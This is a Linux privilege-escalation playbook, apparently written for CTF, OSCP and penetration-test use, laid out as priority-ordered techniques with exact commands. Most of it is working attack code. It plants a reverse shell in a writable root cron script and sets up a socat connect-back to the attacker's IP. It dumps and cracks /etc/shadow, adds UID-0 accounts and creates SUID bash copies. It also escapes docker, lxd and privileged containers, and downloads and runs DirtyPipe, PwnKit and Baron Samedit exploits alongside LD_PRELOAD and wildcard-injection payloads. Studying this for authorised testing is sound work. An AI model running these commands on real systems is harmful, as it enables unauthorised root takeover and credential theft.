---
id: "05"
title: "Linux PrivEsc"
tags: ["linux"]
---
# 05 — Linux Privilege Escalation Methodology

> **Description:** From low-priv shell to root — complete Linux privilege escalation reference.
> **Best For:** Any Linux target post-exploitation — CTF, OSCP exam, real engagements.
> **Strength:** Priority-ordered escalation paths with exact commands, real examples, and tool usage for every technique.

---

## Decision Tree: Shell on Linux → What First?

> You landed a low-priv shell on the Linux host (www-data, a service user). Stabilize first, enumerate hard, then escalate in priority order.

```
Low-priv shell on the Linux host (www-data or a user) →

  STEP 1: Shell Stabilization (get a real PTY before anything else)
      ↓
  STEP 2: System Enumeration (kernel, users, SUID, cron, writable paths)
      ↓
  STEP 3: sudo -l → GTFOBins Workflow (check your sudo rights, escape any binary)
      → SUID Binary Exploitation (any unusual SUID-root binaries?)
      → Cron Job Exploitation (writable scripts running as root?)
      ↓
  STEP 4: Password Hunting (creds in configs, history, and .ssh keys)
      ↓
  STEP 5: LinPEAS & pspy Usage (automate the sweep, watch running processes)
      → Kernel Exploits (last resort, match the exact version)
```

---

## Escalation Priority Order

| Priority | Technique | Why |
| --- | --- | --- |
| 1 | `sudo -l` → GTFOBins | Fast, reliable, very common |
| 2 | SUID binaries | Common misconfiguration |
| 3 | Cron jobs | Scripts running as root often writable |
| 4 | Password reuse / hunting | Configs frequently contain creds |
| 5 | Writable `/etc/passwd` | Old or misconfigured boxes |
| 6 | Capabilities | Underrated, often missed |
| 7 | NFS `no_root_squash` | Niche but instant root |
| 8 | Kernel exploits | Last resort — noisy, may crash |

---

## 1. Shell Stabilization

**Do this immediately after getting any shell — before anything else.**

### Method 1: Python PTY (Most Common)

```bash
# On victim:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or python2:
python -c 'import pty; pty.spawn("/bin/bash")'

# Background the shell:
Ctrl+Z

# On attacker — fix terminal:
stty raw -echo; fg
# Press Enter

# On victim — set terminal type:
export TERM=xterm
stty rows 38 cols 151    # Match your actual terminal: run `stty size` on attacker first
```

### Method 2: script Command

```bash
/usr/bin/script -qc /bin/bash /dev/null
# Then: Ctrl+Z → stty raw -echo; fg → export TERM=xterm
```

### Method 3: socat (Best Quality — Full Interactive Shell)

```bash
# Attacker — start listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Victim — connect back:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<YOUR-IP>:4444

# Transfer socat to victim if not installed:
wget http://<YOUR-IP>/socat -O /tmp/socat && chmod +x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<YOUR-IP>:4444
```

---

## 2. System Enumeration

### First 10 Commands on Any Linux Shell

```bash
id && whoami
sudo -l                             # Critical — check immediately
uname -a                            # Kernel version → CVE search
cat /etc/os-release                 # Distro info
cat /etc/passwd                     # Users with shells
netstat -tlnp 2>/dev/null || ss -tlnp  # Internal services
ps aux                              # Running processes
ls -la /home/                       # Other users' home dirs
env                                 # Environment variables — may contain creds
cat /etc/crontab                    # Scheduled jobs
```

### Deep System Enumeration

```bash
# Users with shells
grep -v 'nologin\|false' /etc/passwd

# Password hashes
cat /etc/shadow 2>/dev/null
unshadow /etc/passwd /etc/shadow > combined.txt
john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt

# Interesting SUID binaries
find / -perm -4000 -type f 2>/dev/null | sort
find / -perm -u=s -type f 2>/dev/null | sort

# World-writable files and directories
find / -writable -type f 2>/dev/null | grep -v proc
find / -writable -type d 2>/dev/null | grep -v proc

# Recently modified files
find / -mtime -5 -type f 2>/dev/null | grep -v proc | grep -v sys

# Readable files in /etc
ls -la /etc/ | grep -v root

# Internal services
ss -tlnp
netstat -tlnp 2>/dev/null
cat /etc/services

# Mounted drives
df -h
cat /etc/fstab
mount | grep -v "proc\|sys\|dev\|run\|tmpfs"
```

---

## 3. sudo -l → GTFOBins Workflow

```bash
sudo -l
# Look for entries like:
# (ALL : ALL) NOPASSWD: /usr/bin/vim
# (root) NOPASSWD: /usr/bin/find
# (ALL) /usr/bin/python3 /opt/script.py
```

**For every binary found → immediately check [GTFOBins](https://gtfobins.github.io)**

### 5 Real GTFOBins Examples

**vim:**
```bash
sudo vim -c ':!/bin/bash'
# or:
sudo vim -c ':set shell=/bin/bash' -c ':shell'
```

**find:**
```bash
sudo find /tmp -exec /bin/bash \; -quit
sudo find . -exec /bin/sh \; -quit
```

**python3:**
```bash
sudo python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
# If limited to a script:
sudo python3 /opt/script.py    # Check if script path is writable
echo 'import os; os.system("/bin/bash")' >> /opt/script.py
sudo python3 /opt/script.py
```

**awk:**
```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

**less:**
```bash
sudo less /etc/passwd
# Inside less: !bash
```

**Other common ones:**

```bash
# nano
sudo nano
# Inside nano: Ctrl+R → Ctrl+X → reset; sh 1>&0 2>&0

# tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# zip
sudo zip /tmp/x.zip /etc/passwd -T --unzip-command="sh -c /bin/bash"

# nmap (older)
echo "os.execute('/bin/bash')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse

# env
sudo env /bin/bash

# man
sudo man man
# In man: !/bin/bash

# more
sudo more /etc/passwd
# In more: !/bin/bash
```

**sudo with specific file:**
```bash
# If rule is: (root) NOPASSWD: /usr/bin/python3 /home/user/script.py
# Check if you can write to the script
ls -la /home/user/script.py
echo 'import os; os.system("chmod +s /bin/bash")' >> /home/user/script.py
sudo /usr/bin/python3 /home/user/script.py
/bin/bash -p
```

---

## 4. SUID Binary Exploitation

### Detection

```bash
find / -perm -4000 -type f 2>/dev/null | sort
find / -perm -u=s -type f 2>/dev/null | sort

# Check each result against GTFOBins → https://gtfobins.github.io (filter: SUID)
```

### 3 Common SUID Examples

**bash (if SUID is set on bash itself):**
```bash
ls -la /bin/bash    # Look for: -rwsr-xr-x
/bin/bash -p        # -p flag preserves effective UID = root shell instantly
```

**cp (if SUID is set):**
```bash
# Overwrite /etc/shadow or /etc/passwd
# Create a new passwd entry:
openssl passwd -1 -salt root hacked     # Generate hash
echo "root2:HASH:0:0:root:/root:/bin/bash" >> /tmp/newpasswd
cp /tmp/newpasswd /etc/passwd
su root2    # Password: hacked
```

**find:**
```bash
# Check if SUID
ls -la /usr/bin/find
find / -exec /bin/bash -p \; -quit
```

**Custom SUID binaries / unknown binary with SUID:**
```bash
# Run it and observe behavior
strings /path/to/suid_binary    # Look for system() calls, relative paths
ltrace /path/to/suid_binary     # Trace library calls
strace /path/to/suid_binary 2>&1 | head -30    # Trace syscalls

# If it calls a program using a relative path → PATH hijacking
export PATH=/tmp:$PATH
echo '#!/bin/bash\nbash -p' > /tmp/<PROGRAM-NAME>
chmod +x /tmp/<PROGRAM-NAME>
/path/to/suid_binary    # Calls our fake binary as root
```

---

## 5. Cron Job Exploitation

### Detection

```bash
# Static crontab files
cat /etc/crontab
cat /etc/cron.d/*
ls /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
crontab -l              # Current user's crontab
crontab -l -u root      # Root's crontab (if readable)

# Dynamic — pspy (watches process creation without root)
# Download: https://github.com/DominicBreuker/pspy
wget http://<YOUR-IP>/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64             # Watch for cron processes — wait 2-3 minutes
```

### Writable Script Abuse

```bash
# Crontab shows: */1 * * * * root /opt/backup.sh
ls -la /opt/backup.sh    # Check if writable

# It is writable — inject reverse shell
echo 'bash -i >& /dev/tcp/<YOUR-IP>/4444 0>&1' >> /opt/backup.sh
# Wait for the next execution → catch on nc -lvnp 4444
```

### PATH Hijacking in Cron

```bash
# Crontab line: PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# Script runs: tar czf /tmp/backup.tar.gz /home/user
# "tar" is called without full path AND /home/user is first in PATH

# Create malicious tar in /home/user
echo '#!/bin/bash' > /home/user/tar
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /home/user/tar
chmod +x /home/user/tar
# Wait for cron to run
/tmp/bash -p    # Root shell
```

---

## 6. Password Hunting

```bash
# Shell history files
cat ~/.bash_history
cat ~/.zsh_history
cat /home/*/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null

# SSH keys
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
cat ~/.ssh/id_rsa

# Web application configs (high value)
find / -name "wp-config.php" 2>/dev/null
find / -name "config.php" 2>/dev/null
find / -name "database.yml" 2>/dev/null
find / -name "settings.py" 2>/dev/null
find / -name ".env" 2>/dev/null
find / -name "*.conf" 2>/dev/null | xargs grep -l "pass" 2>/dev/null

# Common config file locations
cat /var/www/html/config.php 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null
cat /etc/mysql/my.cnf 2>/dev/null
cat /etc/apache2/apache2.conf 2>/dev/null

# Look for password strings
grep -rl "password" /var/www/ 2>/dev/null
grep -rl "passwd" /etc/ 2>/dev/null
grep -ri "db_pass\|DB_PASS\|password\|passwd\|secret\|token\|api_key" /var/www/ 2>/dev/null

# Check for .git directories
find / -name ".git" -type d 2>/dev/null
git -C /path/.git log --oneline 2>/dev/null   # Old commits may have creds

# Sensitive files
cat /etc/shadow 2>/dev/null
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" 2>/dev/null
```

---

## 7. Writable /etc/passwd

```bash
# Check if writable
ls -la /etc/passwd
# Look for: -rw-rw-r-- or -rw-r--rw-

# Generate password hash
openssl passwd -1 -salt hacker "hacked123"
# Example output: $1$hacker$xyz123...

# Add root user with UID 0
echo 'hacker:$1$hacker$xyz123...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login as the new root user
su hacker    # Password: hacked123
id           # Should show: uid=0(root)
```

---

## 8. Kernel Exploits

**Last resort — can crash the system. Always try other vectors first.**

```bash
# Step 1: Identify kernel version
uname -a
cat /proc/version
cat /etc/os-release

# Step 2: Search for exploits
searchsploit linux kernel <VERSION>
searchsploit ubuntu <VERSION>

# Step 3: Google
# "Linux kernel X.X.X privilege escalation"
# "Ubuntu 18.04 local privilege escalation CVE"
# site:exploit-db.com linux kernel 4.4

# Example: DirtyPipe (CVE-2022-0847) — Linux kernel 5.8 – 5.16.11
# Affects: most distros with kernel in that range
uname -r    # Check version: 5.8 - 5.16.11
# Exploit:
wget https://haxx.in/files/dirtypipez.c -O /tmp/dirtypipez.c
gcc /tmp/dirtypipez.c -o /tmp/dirtypipe
/tmp/dirtypipe /usr/bin/sudo    # Makes /usr/bin/sudo an SUID shell
/usr/bin/sudo    # Root shell

# Example: DirtyCow (CVE-2016-5195) — Linux < 4.8.3 (old boxes)
searchsploit dirty cow
searchsploit -m 40839    # Copy to current dir
gcc -pthread 40839.c -o dirty -lcrypt
./dirty <new-password>
su firefart    # Login with new password

# Linux Exploit Suggester 2
wget http://<YOUR-IP>/les2.pl -O /tmp/les2.pl
perl /tmp/les2.pl
```

---

## 9. Linux Capabilities

```bash
# Find capabilities on binaries
getcap -r / 2>/dev/null

# High-value capabilities:
# cap_setuid — can set UID to 0
# cap_net_raw — raw socket access (not directly for root but useful)
# cap_dac_read_search — can read any file

# Example: python3 with cap_setuid
# getcap output: /usr/bin/python3 = cap_setuid+eip
/usr/bin/python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

# Example: perl with cap_setuid
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# Example: ruby with cap_setuid
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# Example: vim with cap_setuid
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash","bash","-c","reset;exec bash")'

# Example: tar with cap_dac_read_search (read any file)
tar xf /etc/shadow -I '/bin/sh -c "cat /dev/stdin"'

# Check GTFOBins for each capability: https://gtfobins.github.io (filter: Capabilities)
```

---

## 10. NFS Misconfiguration (no_root_squash)

```bash
# On attacker — check exports
showmount -e <TARGET-IP>

# Check for no_root_squash in output or on target
cat /etc/exports
# Dangerous line: /home/user *(rw,no_root_squash)

# Mount the share FROM ATTACKER (as root)
mkdir /mnt/nfs
mount -t nfs <TARGET-IP>:/home/user /mnt/nfs -nolock

# Copy bash to the share and set SUID
cp /bin/bash /mnt/nfs/bash_suid
chmod +s /mnt/nfs/bash_suid

# On target — execute it
/home/user/bash_suid -p    # Runs as root
id    # uid=1000(user) euid=0(root)
```

---

## 11. LinPEAS & pspy Usage

### LinPEAS

```bash
# Download to victim
wget http://<YOUR-IP>/linpeas.sh -O /tmp/linpeas.sh
curl http://<YOUR-IP>/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh

# Run and save output
/tmp/linpeas.sh | tee /tmp/linpeas_output.txt
/tmp/linpeas.sh -a     # All checks (slower but more thorough)

# Download: https://github.com/carlospolop/PEASS-ng/releases

# Reading LinPEAS output — focus on RED/YELLOW:
# RED text = Critical findings (sudo, SUID, writeable paths, creds found)
# YELLOW text = Interesting findings worth investigating
# Work top-down through RED sections first
# Key sections to check:
#   - Sudo version / CVEs
#   - Sudo rules
#   - SUID binaries (non-default ones)
#   - Writable /etc/passwd or /etc/shadow
#   - Cron jobs
#   - Passwords in files
#   - Running services as root
```

### pspy

```bash
# Download to victim
wget http://<YOUR-IP>/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64

# Run (watches process creation — no root needed)
/tmp/pspy64
/tmp/pspy64 -pf -i 1000    # Print files, 1s interval

# Wait 2-5 minutes — watch for:
# - Commands running as UID=0 (root)
# - Cron scripts executing
# - Services restarting
# - Interesting paths being called

# Download: https://github.com/DominicBreuker/pspy/releases
```

---

## 12. Container Escapes & Privileged Groups

**What it is:** Membership in a privileged group is often a direct path to root with no exploit at all. The `docker` and `lxd` / `lxc` groups are root-equivalent by design; `disk` reads the raw device, `shadow` reads the hash file, `adm` reads the logs. And if you land inside a container, a misconfiguration (a privileged container, or the Docker socket mounted in) lets you break out onto the host. Always check `id` before you reach for an exploit.

```bash
# First thing: what groups am I in?
id
# Root-equivalent groups to look for: docker, lxd, lxc, disk, shadow, adm, sudo, wheel
```

```bash
# docker group is root. Mount the whole host filesystem into a throwaway container.
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# Or read any root-only file directly:
docker run -v /:/mnt --rm -it alpine cat /mnt/etc/shadow
```

```bash
# A Docker socket exposed inside a container is the same as docker-group access.
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
```

```bash
# lxd / lxc group is root. Import a small image, attach the host disk, chroot in.
lxc image import ./alpine.tar.gz --alias privesc
lxc init privesc r00t -c security.privileged=true
lxc config device add r00t host-root disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh
# Inside the container: cd /mnt/root to reach the host filesystem, as root
```

```bash
# disk group can read (or write) the raw filesystem device with no root.
df -h /
debugfs -R 'cat /etc/shadow' /dev/sda1
```

```bash
# Inside a privileged container? Escape to the host via the cgroup release_agent.
# Confirm you are privileged first:
cat /proc/self/status | grep CapEff
fdisk -l
# CapEff 0000003fffffffff (all caps) or visible host disks means privileged.
# The classic release_agent escape runs your script as root on the HOST:
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "id > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
```

---

## 13. One-Shot Local Root: PwnKit & Baron Samedit

**What it is:** Two near-universal userspace bugs that hand any local user a root shell with no special rights and no kernel risk. Unlike kernel exploits they will not panic the box, so reach for them early. PwnKit (CVE-2021-4034) abuses `pkexec`, present and SUID on almost every pre-2022 distro. Baron Samedit (CVE-2021-3156) abuses `sudo` itself, shipped by default for a decade. Both are cross-referenced in the CVE Vault.

```bash
# PwnKit: is pkexec present and SUID?
ls -l /usr/bin/pkexec && pkexec --version
# Self-contained exploit to root:
git clone https://github.com/ly4k/PwnKit && cd PwnKit && ./PwnKit
```

```bash
# Baron Samedit: quick check (a segfault or "sudoedit:" error means vulnerable).
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
sudo --version | head -1
# Vulnerable ranges: sudo 1.8.2 to 1.8.31p2 and 1.9.0 to 1.9.5p1.
# Compile and run to root:
git clone https://github.com/blasty/CVE-2021-3156 && cd CVE-2021-3156 && make && ./sudo-hax-me-a-sandwich
```

---

## 14. LD_PRELOAD, LD_LIBRARY_PATH & Wildcard Injection

**What it is:** Two classic primitives worth checking the moment you read `sudo -l` or find a root job touching a directory you can write. If a sudo rule keeps `LD_PRELOAD` or `LD_LIBRARY_PATH` in the environment, you force root to load a shared object you wrote. Wildcard injection abuses a root script that globs a writable directory (`tar *`, `rsync`, `chown`, `chmod`) so your filenames are read as command-line flags.

```bash
# LD_PRELOAD: only when `sudo -l` shows env_keep+=LD_PRELOAD.
echo 'void _init(){unsetenv("LD_PRELOAD");setgid(0);setuid(0);system("/bin/bash -p");}' > /tmp/x.c
gcc -fPIC -shared -o /tmp/x.so /tmp/x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so <ALLOWED-BINARY>
```

```bash
# LD_LIBRARY_PATH: hijack a library a sudo-allowed binary loads.
ldd <ALLOWED-BINARY>
# Build a malicious .so exporting a symbol it imports, drop it in /tmp, then:
sudo LD_LIBRARY_PATH=/tmp <ALLOWED-BINARY>
```

```bash
# Wildcard injection: a root cron/script runs e.g. `tar czf /root/backup.tar.gz *`
# in a directory you can write to. Plant filenames tar reads as options:
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > runme.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh runme.sh'
# When root's `tar *` runs, runme.sh executes as root:
/tmp/rootbash -p
```

---

## 15. Writable systemd Services & Timers

**What it is:** On modern Linux, systemd has largely replaced cron, and its units are a frequently-missed privesc surface. A writable `.service` or `.timer` file, or a root-run unit whose `ExecStart` binary or script you can edit, is a clean path to root. Timers are the systemd equivalent of cron jobs and are easy to overlook.

```bash
# Find units and timers you can write to, and what runs on a schedule.
find /etc/systemd/system /lib/systemd/system /run/systemd/system -writable 2>/dev/null
systemctl list-timers --all
# Inspect what a root service actually executes (is its ExecStart writable?):
systemctl cat <SERVICE>
```

```bash
# Writable unit file: repoint ExecStart at a payload, reload, then trigger it.
sed -i 's#^ExecStart=.*#ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"#' /etc/systemd/system/<SERVICE>.service
systemctl daemon-reload && systemctl restart <SERVICE>
/tmp/rootbash -p
```

```bash
# Writable ExecStart target: a root unit calls a script you can edit.
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> <WRITABLE-EXECSTART-SCRIPT>
# Trigger the service/timer or wait for its schedule, then:
/tmp/rootbash -p
```
